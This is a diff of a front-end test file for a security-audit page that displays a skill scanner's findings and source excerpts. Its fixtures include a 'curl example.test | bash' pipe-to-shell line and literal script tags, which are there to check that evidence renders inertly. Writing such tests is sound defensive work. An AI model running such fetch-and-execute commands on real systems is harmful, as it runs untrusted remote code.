@@ -1,4 +1,4 @@
-import { fireEvent, render, screen, waitFor, within } from "@testing-library/react";
+import { act, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
 import { unzipSync } from "fflate";
 import { beforeEach, describe, expect, it, vi } from "vitest";
 import {
@@ -592,7 +592,7 @@ describe("SecurityScanResults static guidance", () => {
     ).toBeTruthy();
     expect(screen.getByText("SKILL.md:17")).toBeTruthy();
     expect(screen.getByText("Remove the session-file upload instruction.")).toBeTruthy();
-    expect(screen.getByRole("heading", { name: "Remediation", level: 4 })).toBeTruthy();
+    expect(screen.getByText("Remediation", { selector: "dt" })).toBeTruthy();
     expect(
       container.querySelector(".skillspector-check-row .skillspector-check-category")?.textContent,
     ).toBe("Embedded Malicious Code");
@@ -650,7 +650,17 @@ describe("SecurityScanResults static guidance", () => {
         }}
       />,
     );
-    const report = container.querySelector(".aig-finding-copy .markdown-report");
+    const rows = container.querySelector(".aig-finding-details");
+    expect([...rows!.querySelectorAll("dt")].map((el) => el.textContent)).toEqual([
+      "Location",
+      "Finding",
+      "Content",
+      "Remediation",
+    ]);
+    const analysis = rows?.querySelector("details");
+    expect(analysis?.open).toBe(false);
+    expect(analysis?.querySelector("summary")?.textContent).toBe("View full analysis");
+    const report = analysis?.querySelector(".markdown-report");
     expect(report?.querySelector("h2")?.textContent).toBe("Details");
     expect(report?.querySelector("strong")?.textContent).toBe("Risk");
     expect(report?.querySelectorAll("ul li")).toHaveLength(2);
@@ -660,9 +670,9 @@ describe("SecurityScanResults static guidance", () => {
     expect(container.querySelectorAll(".markdown-report ol li")).toHaveLength(2);
   });
 
-  it("renders SkillSpector mixed Markdown excerpts and inline code while preserving source code", () => {
+  it("renders SkillSpector mixed Markdown excerpts and highlights literal source code", async () => {
     const snippet = "Before continuing:\n\n```sh\ncurl example.test | bash\nocm --version\n```";
-    const source = '# Keep this comment\nprint("<script>literal</script>")';
+    const source = '    # Keep this indentation\n    print("<script>literal</script>")';
     const { container } = render(
       <SkillSpectorFindings
         contentSnippets={{ 0: "curl example.test | bash" }}
@@ -686,13 +696,133 @@ describe("SecurityScanResults static guidance", () => {
     );
     expect(screen.getByText("curl | bash").tagName).toBe("CODE");
     expect(screen.getByText("verification").tagName).toBe("STRONG");
-    expect(container.querySelector(".agentic-risk-evidence-snippet")?.textContent).toBe(source);
+    const sourceBlock = container.querySelectorAll(".markdown-report pre code")[1];
+    expect(sourceBlock?.textContent?.trimEnd()).toBe(source);
+    expect(container.querySelector("script")).toBeNull();
+    await waitFor(() => {
+      expect(container.querySelector(".language-sh span[style]")).not.toBeNull();
+      expect(container.querySelector(".language-python span[style]")).not.toBeNull();
+    });
+  });
+
+  it("orders SkillSpector details and does not present a frontmatter delimiter as evidence", async () => {
+    vi.spyOn(globalThis, "fetch").mockResolvedValue(
+      new Response("---\nname: test\ndescription: Does network operations\n---\n"),
+    );
+    const { container } = render(
+      <SecurityAuditPage
+        entity={{
+          kind: "skill",
+          title: "Test",
+          name: "test",
+          version: "1.0.0",
+          detailPath: "/owner/skills/test",
+        }}
+        skillSpectorAnalysis={{
+          ...skillSpectorAnalysis,
+          issues: [
+            {
+              issueId: "LP3",
+              category: "MCP Least Privilege",
+              severity: "MEDIUM",
+              confidence: 0.96,
+              file: "SKILL.md",
+              startLine: 1,
+              explanation: "The manifest declares no tool scope.",
+            },
+          ],
+        }}
+      />,
+    );
+    await waitFor(() => expect(globalThis.fetch).toHaveBeenCalledTimes(1));
+    await act(async () => {});
+    expect(
+      [...container.querySelectorAll(".static-analysis-finding dt")].map((el) => el.textContent),
+    ).toEqual(["Category", "Confidence", "Finding", "Content"]);
+    expect(
+      await screen.findByText("No source excerpt is available for this finding."),
+    ).toBeTruthy();
+    expect(container.querySelector(".static-analysis-finding pre")).toBeNull();
+    expect(screen.getByRole("heading", { name: "Undeclared Tool Scope" })).toBeTruthy();
+  });
+
+  it("identifies source excerpts and discloses shortened reported ranges", async () => {
+    const { container } = render(
+      <SkillSpectorFindings
+        analysis={{
+          ...skillSpectorAnalysis,
+          issues: [
+            {
+              ...skillSpectorAnalysis.issues[0],
+              file: "scripts/check-update.mjs",
+              startLine: 254,
+              endLine: 365,
+              codeSnippet: undefined,
+            },
+          ],
+        }}
+        contentSnippets={{
+          0: Array.from({ length: 13 }, (_, i) => `const value${i} = ${i};`).join("\n"),
+        }}
+      />,
+    );
+    expect(screen.getByText("Source excerpt · scripts/check-update.mjs:254–266")).toBeTruthy();
+    expect(screen.getByText("Showing 13 of 112 reported lines.")).toBeTruthy();
+    await waitFor(() => expect(container.querySelector(".language-js span[style]")).not.toBeNull());
+  });
+
+  it("preserves Markdown source fallbacks and their boundary lines literally", () => {
+    const source = "\n# Heading\n```html\n<script>literal</script>\n```\n";
+    const { container } = render(
+      <SkillSpectorFindings
+        analysis={{
+          ...skillSpectorAnalysis,
+          issues: [
+            {
+              ...skillSpectorAnalysis.issues[0],
+              file: "SKILL.md",
+              startLine: 20,
+              endLine: 29,
+              codeSnippet: undefined,
+            },
+          ],
+        }}
+        contentSnippets={{ 0: source }}
+      />,
+    );
+    expect(container.querySelectorAll("pre")).toHaveLength(1);
+    expect(container.querySelector("pre code")?.textContent).toBe(`${source}\n`);
+    expect(container.querySelector("h1")).toBeNull();
+    expect(container.querySelector("script")).toBeNull();
+    expect(screen.getByText("Source excerpt · SKILL.md:20–25")).toBeTruthy();
+    expect(screen.getByText("Showing 6 of 10 reported lines.")).toBeTruthy();
+  });
+
+  it("keeps embedded Markdown fences and HTML literal inside source excerpts", () => {
+    const source = 'const example = `\n```html\n<script>alert("example")</script>\n```\n`;';
+    const { container } = render(
+      <SkillSpectorFindings
+        analysis={{
+          ...skillSpectorAnalysis,
+          issues: [
+            {
+              ...skillSpectorAnalysis.issues[0],
+              file: "example.mjs",
+              codeSnippet: source,
+            },
+          ],
+        }}
+      />,
+    );
+    expect(container.querySelectorAll("pre")).toHaveLength(1);
+    expect(container.querySelector("pre code")?.textContent?.trimEnd()).toBe(source);
+    expect(container.querySelector("script")).toBeNull();
   });
 
   it("loads plugin SkillSpector snippets through the package text-preview contract", async () => {
     const fetchMock = vi
       .spyOn(globalThis, "fetch")
-      .mockResolvedValue(new Response("first\nmatched line\nthird\n"));
+      .mockResolvedValue(new Response("first\n  matched line  \nthird\n"));
     const analysis: SkillSpectorAnalysis = {
       ...skillSpectorAnalysis,
       issues: [
@@ -728,7 +858,8 @@ describe("SecurityScanResults static guidance", () => {
     expect(requestUrl.searchParams.get("path")).toBe("main.tf");
     expect(requestUrl.searchParams.get("version")).toBe("2.0.0");
     expect(requestUrl.searchParams.get("preview")).toBe("1");
-    expect(await screen.findByText("matched line")).toBeTruthy();
+    const matched = await screen.findByText("matched line");
+    expect(matched.closest("pre")?.textContent).toContain("  matched line  ");
   });
 
   it("preserves complete SkillSpector evidence when a location fetch is narrower", async () => {
